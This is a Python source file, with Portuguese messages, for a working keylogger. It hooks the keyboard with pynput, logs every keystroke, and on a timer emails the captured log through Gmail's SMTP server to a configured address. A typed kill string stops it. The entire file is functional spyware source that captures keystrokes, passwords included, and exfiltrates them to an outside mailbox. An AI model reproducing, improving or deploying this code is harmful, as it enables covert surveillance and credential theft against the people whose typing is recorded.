import os
import sys

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

import smtplib
from pynput import keyboard
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Timer
from config.key_mappings import KeyMappings
from config.settings import Settings

log = ""
typed_chars = []

def send_email():
    global log
    
    if log and len(log.strip()) > 0:
        try:
            msg = MIMEMultipart()
            msg['Subject'] = "Dados capturados pelo Keylogger"
            msg['From'] = Settings.EMAIL_ORIGIN
            msg['To'] = Settings.EMAIL_DESTINATION
            
            body = f"""
            Log de teclas capturadas:
            
            {log}
            
            ---
            Keylogger - Dados capturados
            Timestamp: {os.times()}
            """
            
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(Settings.EMAIL_ORIGIN, Settings.PASS_EMAIL)
            server.send_message(msg)
            server.quit()
            
            print("✅ Email enviado com sucesso!")
            print(f"📧 Caracteres enviados: {len(log)}")
            
        except Exception as e:
            print(f"❌ Erro ao enviar email: {e}")
    
    log = ""
    
    Timer(Settings.EMAIL_INTERVAL, send_email).start()

def on_press(key):
    global log, typed_chars
    
    log_content = ""
    should_write_to_file = True
    
    try:
        char = key.char
        if char is not None and isinstance(char, str):
            log_content = char
            
            log += char
            
            if char.isprintable() and char not in ['\t', '\n', '\b']:
                typed_chars.append(char)
        else:
            raise AttributeError("char is None or not string")
        
    except AttributeError:
        key_str = str(key)
        
        if key in KeyMappings.SPECIAL_KEYS:
            special_char = KeyMappings.SPECIAL_KEYS[key]
            if special_char:  
                log_content = special_char
                log += special_char
            
            if key == keyboard.Key.backspace:
                if typed_chars:
                    typed_chars.pop()
                    
        elif key_str in KeyMappings.KEYPAD_MAP:                
            keypad_char = KeyMappings.KEYPAD_MAP[key_str]
            log_content = keypad_char
            log += keypad_char
            
            if key_str in KeyMappings.KEYPAD_NUMBERS:
                num_char = KeyMappings.KEYPAD_NUMBERS[key_str]
                typed_chars.append(num_char)
                
        elif key in KeyMappings.IGNORED_KEYS:
            should_write_to_file = False
        else:
            key_name = str(key).replace('Key.', '').replace("'", "")
            log_content = f'[{key_name}]'
            log += f'[{key_name}]'
        
    if len(typed_chars) > len(Settings.TARGET_STRING):
        typed_chars = typed_chars[-len(Settings.TARGET_STRING):]
    
    current_string = ''.join(typed_chars)
    if Settings.TARGET_STRING in current_string:
        print("Hacker discovered! Encerrando programa...")
        os._exit(0)
        return False

def on_release(key):
    pass

def main():
    print("Keylogger com Email iniciado...")
    print(f"Digite '{Settings.TARGET_STRING}' para encerrar")
    send_email()
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()